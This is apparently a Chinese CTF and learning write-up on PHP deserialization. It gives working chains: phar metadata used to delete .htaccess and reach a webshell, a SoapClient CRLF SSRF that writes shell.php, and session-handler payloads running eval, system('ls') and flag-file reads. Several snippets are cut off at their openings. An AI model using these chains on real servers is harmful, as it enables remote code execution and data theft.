    filepath = $filepath;
            $this->filename = $filename;
            $this->checker = new Profile();
        }
    }
    class Profile{
        public $username;
        public $password;
        public $admin;
        function __construct()
        {
            $this->username = "./sandbox/f528764d624db129b32c21fbca0cb8d6/.htaccess";
            $this->password = "ZipArchive::OVERWRITE";
            $this->admin = new ZipArchive();
        }
    }
    $a = new File("threezh1", "threezh1");
    class TestObject {
    }
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub(""); //设置stub
    $o = new TestObject();
    $phar->setMetadata($a); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    ?>
先把phar文件生成出来上传。
再访问：[http://127.0.0.1/view.php?filename=9c7f4a2fbf2dd3dfb7051727a644d99f.phar&filepath=php://filter/resource=phar://sandbox/f528764d624db129b32c21fbca0cb8d6/9c7f4a2fbf2dd3dfb7051727a644d99f.phar](http://127.0.0.1/view.php?filename=9c7f4a2fbf2dd3dfb7051727a644d99f.phar&filepath=php://filter/resource=phar://sandbox/f528764d624db129b32c21fbca0cb8d6/9c7f4a2fbf2dd3dfb7051727a644d99f.phar)
即可把.htaccess删除，再直接去访问一句话木马连蚁剑拿flag。(这里由于题目已经关了，自己的环境总是出问题，就没复现成功。)
## 原生类魔法函数(soapClient类)
参考这一篇：[反序列化攻击面拓展提高篇](https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/)
    SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一
    WSDL 用来描述如何访问具体的接口 
    UDDI用来管理，分发，查询webService 
    SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。
    webService相当于 HTTP + XML
SoapClient()方法
`public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )`
第一个参数是用来指明是否是wsdl模式，如果为null，那就是非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求。
用Soap进行SSRF也有两个需要注意的点：
  * Soap不是默认开启的，需要手动开启
  * 需要触发__call方法才能进行SSRF
SOAP => CRLF => SSRF
文章当中的exp.php：
    ");';
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: xxxx=1234'
        );
    $b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
    $aaa = serialize($b);
    $aaa = str_replace('^^','%0d%0a',$aaa);
    $aaa = str_replace('&','%26',$aaa);
    echo $aaa;
    $c=unserialize(urldecode($aaa));
    $c->ss();
    ?>
test.php:
访问 `http://127.0.0.1/exp.php` 可在目录下写入一个shell.php。
## Session反序列化
参考这一篇[PHP中SESSION反序列化机制](https://blog.spoock.com/2016/10/16/php-serialize-problem/)
### PHP中的session保存
PHP.ini有以下配置项用于控制session有关的设置：
    session.save_path="D:\xampp\tmp"    表明所有的session文件都是存储在xampp/tmp下
    session.save_handler=files          表明session是以文件的方式来进行存储的
    session.auto_start=0                表明默认不启动session
    session.serialize_handler=php       表明session的默认序列话引擎使用的是php序列话引擎
PHP中有多种session的序列话引擎，当我设置session为`$_SESSION["name"] =
"Threezh1";`时。不同的引擎保存的session文件内容如下：
    php: 
        name|s:8:"Threezh1";
        存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
    php_binary:
        names:8:"Threezh1";
        存储方式是，键名+竖线+经过serialize()函数序列处理的值
    php_serialize(php>5.5.4):
        a:1:{s:4:"name";s:8:"Threezh1";}
        存储方式是，经过serialize()函数序列化处理的值
切换不同引擎使用的函数为：`ini_set('session.serialize_handler', '需要设置的引擎');`
test2.php
    hi = 'phpinfo();';
        }
        function __destruct() {
             eval($this->hi);
        }
    }
    ?>
通过源码可以得知，test1中使用的session解析引擎是php_serialize，test2使用的是php。
并且在test1中，`SESSION["spoock"]`的值是可控的。
访问：
`http://localhost/test1.php?a=|O:5:%22lemon%22:1:{s:2:%22hi%22;s:16:%22echo%20%27Threezh1%27;%22;}`
a参数的值为“|” + 一个序列化的对象。
再访问：
`http://localhost/test2.php`
返回：
`Threezh1`
可知我们在session中的解析过程中，对我们的payload进行了反序列化。为什么会出现这种情况呢？
### payload的构造
先看两个解析引擎存储session的格式：
    php: 
        name|s:8:"Threezh1";
        存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
    php_serialize(php>5.5.4):
        a:1:{s:4:"name";s:8:"Threezh1";}
        存储方式是，经过serialize()函数序列化处理的值
思路：
因为储存session的页面(test1)使用的是php_serialize解析引擎，如果我们把session的值中添加一个“|”，在test2页面中使用php解析引擎解析的过程中，就会把“|”前面的值作为一个session键名，对“|”后面就会进行一个反序列化操作。
“|”后面的序列化对象生成：
    hi = 'phpinfo();';
        }
        function __destruct() {
             eval($this->hi);
        }
    }
    $a = new lemon();
    $a->hi = "echo 'Threezh1';";
    echo serialize($a)
    ?>
但是直接这样利用的话，局限性还是太大了。
但在[有趣的php反序列化总结](http://www.91ri.org/15925.html)中介绍了另一种Session反序列化漏洞的利用方式。
当PHP中`session.upload_progress.enabled`打开时，php会记录上传文件的进度，在上传时会将其信息保存在`$_SESSION`中。[详情](https://bugs.php.net/bug.php?id=71101)。
条件：
  1. session.upload_progress.enabled = On (是否启用上传进度报告)
  2. session.upload_progress.cleanup = Off (是否上传完成之后删除session文件)
上传文件进度的报告就会以写入到session文件中，所以我们可以设置一个与session.upload_progress.name同名的变量(默认名为PHP_SESSION_UPLOAD_PROGRESS)，PHP检测到这种同名请求会在`$_SESSION`中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload。
本打算复现：[有趣的php反序列化总结](http://www.91ri.org/15925.html),但在传递payload的时候，payload如果存在"|"。session就会为空，还没有找到解决的方法，如果有师傅遇到同样的问题，还望师傅帮忙解答。
### jarvisoj-web-writeup PHPINFO
题目地址：
    mdzz = 'phpinfo();';
        }
        function __destruct()
        {
            eval($this->mdzz);
        }
    }
    if(isset($_GET['phpinfo']))
    {
        $m = new OowoO();
    }
    else
    {
        highlight_string(file_get_contents('index.php'));
    }
    ?>
开头将session的解析引擎定义为了php。
访问：
可看到session.upload_progress.enabled，session.upload_progress.cleanup都符合条件。
于是构造一个upload.html
poc.php：
    mdzz = "print_r(scandir(__dir__));";
    echo serialize($a);
    ?>
生成序列化的值为：
`O:5:"OowoO":1:{s:4:"mdzz";s:22:"print_r(system('ls'));";}`
在上传的时候抓包，修改上传的内容为序列化的值前加一个“|”。即可遍历目录。
再从phpinfo中的SCRIPT_FILENAME字段得到根目录地址：`/opt/lampp/htdocs/`,构造得到payload：
`O:5:"OowoO":1:{s:4:"mdzz";s:88:"print_r(file_get_contents('/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php'));";}`
得到flag：
## 参考
  * 
  * 
  * 